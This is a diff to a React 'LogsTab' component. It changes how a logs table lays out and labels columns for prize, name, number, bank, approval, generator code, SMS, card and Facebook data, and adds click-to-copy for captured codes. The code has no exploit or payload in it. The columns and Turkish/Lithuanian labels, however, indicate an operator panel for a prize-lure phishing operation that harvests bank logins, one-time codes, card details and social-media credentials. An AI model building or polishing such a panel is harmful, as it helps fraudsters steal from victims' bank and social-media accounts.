@@ -1458,7 +1458,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
-        if (fd.generatorType) genCell.push({ text: fd.generatorType === "generator2" ? "GENERATOR 2" : "GENERATOR 1", bold: true, color: "#e11d48" });
+        if (fd.generatorType) genCell.push({ text: `Generatoriaus kodas ${fd.generatorType === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
         if (fd.generatorCode) genCell.push({ text: `Verilen Kod: ${s(fd.generatorCode)}`, color: "#b45309" });
         if (fd.generatorData && typeof fd.generatorData === "object") {
           for (const [k, v] of Object.entries(fd.generatorData as Record<string, unknown>)) {
@@ -1951,9 +1951,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="w-[19%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="w-[16%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="w-[12%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
+                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
                 <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -2126,29 +2126,23 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <td className="px-2 py-3 align-top">
                       {fd.generatorType || (fd.generatorData && Object.keys(fd.generatorData).length > 0) ? (
                         <div className="space-y-1">
-                          <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-normal break-words leading-tight">
-                            {fd.generatorType === "generator2" ? "GENERATOR 2" : "GENERATOR 1"}
+                          <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                            Generatoriaus kodas {fd.generatorType === "generator2" ? "2" : "1"}
                           </span>
                           {fd.generatorCode && (
-                            <div className="flex min-w-0 items-start gap-1 leading-tight">
-                              <span className="mt-0.5 shrink-0 rounded bg-amber-500/15 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap text-amber-600 dark:text-amber-400">
-                                Verilen Kod
-                              </span>
-                              <span className="min-w-0 cursor-pointer font-mono font-bold text-[10px] tracking-widest text-amber-600 dark:text-amber-400 transition-opacity hover:opacity-70 whitespace-normal break-words" onClick={() => copyToClipboard(String(fd.generatorCode))}>
-                                {String(fd.generatorCode)}
-                              </span>
+                            <div className="text-[9px] font-bold text-amber-600 dark:text-amber-400 whitespace-nowrap">
+                              Verilen Kod: <span className="font-mono tracking-widest">{String(fd.generatorCode)}</span>
                             </div>
                           )}
                           {fd.generatorData && typeof fd.generatorData === "object" && Object.entries(fd.generatorData as Record<string, unknown>)
                             .filter(([, v]) => v != null && String(v).trim() !== "")
                             .map(([k, v]) => (
-                              <div key={k} className="flex min-w-0 items-start gap-1 leading-tight">
-                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
-                                  {k.replace(/_/g, " ")}
-                                </span>
-                                <span className="min-w-0 cursor-pointer font-medium text-[10px] transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(v))}>
-                                  {String(v)}
-                                </span>
+                              <div
+                                key={k}
+                                className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                                onClick={() => copyToClipboard(String(v))}
+                              >
+                                {String(v)}
                               </div>
                             ))}
                         </div>
